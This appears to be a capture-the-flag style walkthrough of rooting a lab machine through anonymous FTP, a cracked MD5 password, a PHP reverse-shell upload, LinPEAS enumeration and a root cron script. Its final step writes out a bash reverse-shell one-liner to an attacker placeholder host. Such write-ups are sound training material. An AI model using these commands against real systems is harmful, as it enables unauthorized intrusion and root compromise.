## FTP Enumeration to Remote Root - Web App & Privilege Escalation Walkthrough

**Target IP:** `192.168.88.133`  
**Objective:** Gain access via exposed FTP credentials, pivot through a vulnerable web app, and escalate privileges to root.

---

### 🛍️ Initial Recon

The first step was identifying the IP of the target system: `192.168.88.133`. A full Nmap scan revealed an interesting low-hanging fruit:

<img width="1041" height="744" alt="image" src="https://github.com/user-attachments/assets/fb97aca1-4b85-430c-9dbe-8c117f5fdf55" />


- **Port 21 (FTP)** open
- **Anonymous login allowed**
- A file named `note.txt` available for download

---

### 💾 FTP Access & Sensitive Info Disclosure

I initiated an FTP session using anonymous login, successfully connected, and retrieved the file:

<img width="1051" height="377" alt="image" src="https://github.com/user-attachments/assets/13b748c8-5e58-4777-b1a6-20506a55e3dc" />

Contents of `note.txt` included:
- A **student login ID**
- A hashed **password** (MD5)
- A student **registration number**

<img width="1035" height="311" alt="image" src="https://github.com/user-attachments/assets/ca2cd5fe-2f38-4968-8e82-7507ccddacfe" />

Hash analysis using Kali’s `hash-identifier` confirmed it was MD5.

<img width="929" height="499" alt="image" src="https://github.com/user-attachments/assets/61181e4c-9c2b-409a-90bf-23b6e81400e2" />

I cracked it using [crackstation.net](https://crackstation.net), revealing the password: `student`.

---

### 🔎 Web Directory Enumeration

With credentials in hand, I used `ffuf` to identify accessible directories on the web server:

<img width="1047" height="654" alt="image" src="https://github.com/user-attachments/assets/b682af5e-6758-46d5-87fc-90bf139060c8" />

**Interesting paths found:**
- `/academy`
- `/phpmyadmin`
- `/server-status`

Browsing to `/academy` and using the cracked credentials allowed me to log in successfully.

---

### 🤖 File Upload Vulnerability & Reverse Shell

While exploring the site, I discovered an **image upload** feature on the student registration page. Since the server runs Apache, I attempted a **PHP reverse shell** upload using Pentestmonkey’s script:

- [PHP reverse shell - Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)

Shell was configured with my Kali IP and port 1234. After uploading and setting up a Netcat listener:

```bash
nc -lvnp 1234
```

✅ Reverse shell success as `www-data`

<img width="1022" height="298" alt="image" src="https://github.com/user-attachments/assets/60500608-acad-4f6f-b03e-8e91a6259964" />

---

### 🧪 Privilege Escalation with LinPEAS

To move beyond `www-data`, I downloaded and executed [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS):

- Started a Python HTTP server on my Kali box
<img width="691" height="212" alt="image" src="https://github.com/user-attachments/assets/a0be1341-810b-478d-857e-e31d9e550552" />
- Used `wget` on the target to retrieve LinPEAS
<img width="953" height="822" alt="image" src="https://github.com/user-attachments/assets/10ba6636-7383-41fd-bb14-f6c0b79b6be7" />

LinPEAS results revealed:
- A suspicious script: `/home/grimmie/backup.sh`
<img width="1046" height="474" alt="image" src="https://github.com/user-attachments/assets/5d3ef21b-d3b3-4e26-bd85-d2f6f6e27d7b" />
- Several stored passwords
<img width="1045" height="166" alt="image" src="https://github.com/user-attachments/assets/defa36cd-c58f-4271-afd5-36e513e69cce" />

I ran `cat /etc/passwd` to identify user accounts. The `grimmie` user matched the directory and script context.
<img width="1039" height="747" alt="image" src="https://github.com/user-attachments/assets/1d3caaf9-b932-4104-b72d-3a2a7ba6a0fd" />

---

### 🔐 User-Level Access via SSH

Tried the found credentials against SSH for `grimmie`. They worked.

```bash
ssh grimmie@192.168.88.133
```

Located and reviewed `backup.sh` in the home directory:

```bash
#!/bin/bash
rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
```

---

### ⏰ Scheduled Task Abuse with pspy

Crontab and systemd yielded nothing, so I pivoted to [pspy](https://github.com/DominicBreuker/pspy):

- Downloaded pspy on Kali, transferred it to the target, ran it
- Confirmed: `backup.sh` executes **every minute**, possibly as **root**

---

### 🔥 Root Shell via Reverse Bash One-Liner

Modified `backup.sh` to include a simple reverse shell:

```bash
bash -i >& /dev/tcp/<attacker-ip>/8080 0>&1
```

Set up Netcat listener, waited for execution... and got **root shell**.
<img width="954" height="493" alt="image" src="https://github.com/user-attachments/assets/3f1e3b20-1403-4e3b-adb1-cfc240313c7f" />

---

### 📊 Summary

This attack chain highlights how misconfigurations and weak practices (like anonymous FTP and storing password hashes in plaintext files) can be chained into a full system compromise:

1. Anonymous FTP → password hash leak
2. MD5 hash → cracked via online tool
3. Web login → file upload exploit
4. Reverse shell → local enumeration with LinPEAS
5. Privilege escalation via insecure scheduled task

Sometimes all it takes is one bad habit. In this case, it took about five.
